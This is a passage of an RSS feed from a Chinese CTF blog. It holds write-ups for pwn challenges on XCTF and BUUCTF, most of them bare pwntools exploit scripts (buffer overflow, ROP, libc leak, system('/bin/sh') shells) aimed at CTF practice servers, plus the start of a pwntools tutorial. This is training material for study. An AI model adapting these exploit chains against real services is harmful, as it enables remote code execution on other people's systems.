remote(<span class="string">'124.126.19.106'</span>,<span class="number">40796</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">a.sendlineafter(<span class="string">'Input:\n'</span>, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(a.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line"></span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(sys_addr) + <span class="string">'9527'</span> + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/xctf-wp/#disqus_thread</comments>
    </item>
    
    <item>
      <title>BUUCTF—WP</title>
      <link>https://www.los-kos.cn/posts/buuctf-wp/</link>
      <guid>https://www.los-kos.cn/posts/buuctf-wp/</guid>
      <pubDate>Mon, 30 Mar 2020 00:00:00 GMT</pubDate>
      <description>
      
        BUUCTF刷题的wp
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>上一篇写的是XCTF的wp，那这篇博客，就记录一些在BUUCTF刷题的wp；</p><a id="more"></a><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>这道题拿过来，还是先看保护机制：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/rip_1.png" alt="rip_1"></p><p>这、这、这个什么保护都没开😂，看样子不难，丢进ida查看伪代码：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/rip_2.png" alt="rip_2"></p><p>这个意思就是，先读取一个字符串，然后输出这个字符串，然后就没有啦；</p><p>再看有个fun()函数，点进去：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/rip_3.png" alt="rip_3"></p><p>这里可以看出，如果控制gets函数，使得输入的字符串，覆盖到fun()函数即可获取shell，这里fun()函数的地址也给了出来，直接利用；</p><p>用它之前还得计算偏移量：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/rip_4.png" alt="rip_4"></p><p>偏移量 = （0xF + 0x8）= 0x17</p><p>这样就可以了，上exp：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26706</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">23</span>+p64(<span class="number">0x401186</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p>nice~~  （￣︶￣）↗　</p><blockquote><p>到这里，一个简单题解，因作者最近忙于功课，下面的题目只写了exp，如有疑问，给我留言或者联系我</p></blockquote><blockquote><p>栈溢出中重要又难的点叫做ROP，下面重点整理这类题目</p></blockquote><h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25467</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./bjdctf_2020_babyrop'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x4006ad</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x400733</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">40</span>+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'Pull up your sword and tell me u story!\n'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(a.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">40</span>+p64(pop_rdi_addr)+p64(binsh_addr)+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'Pull up your sword and tell me u story!\n'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h1><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29718</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./bjdctf_2020_babyrop2'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0400993</span></span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x4008da</span></span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x400887</span></span><br><span class="line"></span><br><span class="line">canary = <span class="string">'%7$p'</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%7$p'</span>+<span class="string">'a'</span>*<span class="number">40</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret_addr)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"I'll give u some gift to help u!\n"</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(a.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%7$p'</span>+<span class="string">'a'</span>*<span class="number">40</span>+p64(pop_rdi)+p64(binsh_addr)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"I'll give u some gift to help u!\n"</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28485</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./OGeek2019babyrop'</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">read_plt=elf.plt[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'\x00'</span>+<span class="string">'\xff'</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*<span class="number">0xe7</span>+<span class="string">'b'</span>*<span class="number">0x4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">read_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">'read'</span>,read_addr)</span><br><span class="line"></span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">'read'</span>)</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_addr=libc_base+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'Correct\n'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0xe7</span>+<span class="string">'b'</span>*<span class="number">0x4</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h1><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29319</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./ciscn_2019_en_2'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.sym[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x400b28</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'Input your choice!'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'Input your Plaintext to be encrypted'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'@'</span>)</span><br><span class="line"></span><br><span class="line">a.recv(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_addr= u64(a.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">"puts"</span>,puts_addr )</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x58</span>+p64(<span class="number">0x4006b9</span>)+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'Input your choice!'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'Input your Plaintext to be encrypted'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h1><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26789</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x40061a</span> </span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x04006b3</span></span><br><span class="line"></span><br><span class="line">pop_rsi_r15 = <span class="number">0x04006b1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x80</span>*<span class="string">'a'</span>+<span class="string">'bbbbbbbb'</span>+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u64(a.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line"></span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x80</span>*<span class="string">'a'</span>+<span class="string">'bbbbbbbb'</span>+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)+p64(main)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/buuctf-wp/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Pwn从入门到放弃</title>
      <link>https://www.los-kos.cn/posts/pwn/</link>
      <guid>https://www.los-kos.cn/posts/pwn/</guid>
      <pubDate>Fri, 27 Mar 2020 07:15:00 GMT</pubDate>
      <description>
      
        在线教pwn如何从入门到放弃
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>我是一名CTF小白，主学习pwn，初学不久，几乎刚入门，现在说说如何“从入门到放弃”：</p><a id="more"></a><h1 id="pwntools的介绍"><a href="#pwntools的介绍" class="headerlink" title="pwntools的介绍"></a>pwntools的介绍</h1><p>首先需要学习的是pwntools，这个也是我刚开始入门就学的东西；那么先来了解一下pwntools：</p><h3 id="什么是pwntools？"><a href="#什么是pwntools？" class="headerlink" title="什么是pwntools？"></a>什么是pwntools？</h3><p>pwntools是一个二进制利用框架，是CTF框架和漏洞利用开发库，用Python开发，能够更快速的编写exp；</p><p>emm这样可能不好理解，简单来讲，就是Python的一个库，在Linux下使用；</p><h3 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h3><p>先来说说怎么安装吧：</p><h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><p>现在大多数人都是使用Windows或者Mac，但是pwntools需要安装在Linux环境中，这里推荐使用虚拟机；</p><p>虚拟机也有很多种，推荐使用VMware，我也给大家准备好了，点击这里下载<a href="https://pan.baidu.com/s/1t2psjlLidp00Cf1k3_-EQQ" target="_blank" rel="noopener">VMware15</a>  提取码：4nu6；当然肯</p><p>定需要镜像，点击这里下载<a href="https://pan.baidu.com/s/1DXDk2uRe4CprrkUqmWbeOA" target="_blank" rel="noopener">Ubuntu16.04</a>  提取码：az58；这个镜像是64位的，当然也可以去官网下载32位的，</p><p>看自己需要吧；       // 如果遇到问题，请联系我，首页有我的联系方式，嘿嘿嘿，随时可以call我；</p><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><p>安装pwntools需要下面几个环境：</p><p><strong>python</strong></p><p><strong>pip</strong></p><p><strong>libssl-dev</strong></p><p><strong>libffi-dev</strong></p><h4 id="pwntools的安装"><a href="#pwntools的安装" class="headerlink" title="pwntools的安装"></a>pwntools的安装</h4><p>安装需要以下几步：</p><p><strong><em>sudo apt-get install libffi-dev</em></strong><br><strong><em>sudo apt-get install libssl-dev</em></strong><br><strong><em>sudo apt-get install python</em></strong><br><strong><em>sudo apt-get install python-pip</em></strong><br><strong><em>sudo pip install pwntools</em></strong><br>注：安装过程可能会有更新pip等的提示，按照提示一步一步走就没问题，有问题请联系我；</p><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>安装完后，打开终端，输入<strong>python</strong>进入<strong>python</strong>命令，然后输入<strong><u>from pwn import *</u></strong> ，不报错即成功；</p><h3 id="pwntools的简单使用"><a href="#pwntools的简单使用" class="headerlink" title="pwntools的简单使用"></a>pwntools的简单使用</h3><p>前面提到，pwntools是python的一个库，那么在写exp的时候，需要掌握以下几个基本语法：</p><h4 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a>基本框架</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'ip'</span>,port)</span><br><span class="line"><span class="comment">#a = process("./文件名")</span></span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'..'</span>)</span><br><span class="line"></span><br><span class="line">payload = ...</span><br><span class="line"></span><br><span class="line">a.sendline(..)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><p>通常来说，基本框架就这么多，但是远远不止，慢慢学；</p><p>下面介绍这些语句是什么意思</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment">#导入pwntools模块</span></span><br><span class="line"></span><br><span class="line">remote(<span class="string">'ip'</span>,port) <span class="comment">#远程连接</span></span><br><span class="line"></span><br><span class="line">process(<span class="string">'./文件名'</span>) <span class="comment">#本地连接</span></span><br><span class="line"></span><br><span class="line">recvn(N) <span class="comment">#接受N(数字)字符</span></span><br><span class="line"></span><br><span class="line">recvline() <span class="comment">#接收一行输出</span></span><br><span class="line"></span><br><span class="line">recvlines(N) <span class="comment">#接收N(数字)行输出</span></span><br><span class="line"></span><br><span class="line">recvuntil(some_string) <span class="comment">#接收到some_string为止</span></span><br><span class="line"></span><br><span class="line">send(payload) <span class="comment">#发送payload</span></span><br><span class="line"></span><br><span class="line">sendline(payload) <span class="comment">#发送payload并进行换行（末尾\n）</span></span><br><span class="line"></span><br><span class="line">sendafter(some_string, payload) <span class="comment">#接收到some_string后,发送你的 payload</span></span><br><span class="line"></span><br><span class="line">interactive() <span class="comment">#回显</span></span><br></pre></td></tr></tbody></table></figure><p>基本框架就这些，再来看其他的：</p><h4 id="Context设置"><a href="#Context设置" class="headerlink" title="Context设置"></a>Context设置</h4><p>context是pwntools用来设置环境的；二进制文件情况特殊，我们可能需要设置一些环境才可以正常运行exp，不然可能会出现错误；</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br></pre></td></tr></tbody></table></figure><p>说明：</p><p>1、os设置系统为Linux，因为pwntools需要在Linux中运行；</p><p>2、arch = ‘amd64/i386’，分别表示程序是64位和32位；</p><p>3、log_level=’debug’,这句话一般调试的时候会加上，这样会看到程序运行完整的过程；</p><h4 id="数据打包"><a href="#数据打包" class="headerlink" title="数据打包"></a>数据打包</h4><p>数据打包就是将一个整数值转换成32位或者64位地址一样的表示方式，构造payload的时候非常方便，其用法如下：</p><p>● p32/p64：打包一个整数，转换成 32位或者64位</p><p>● u32/u64：解包一个字符串，变成一个整数</p><h4 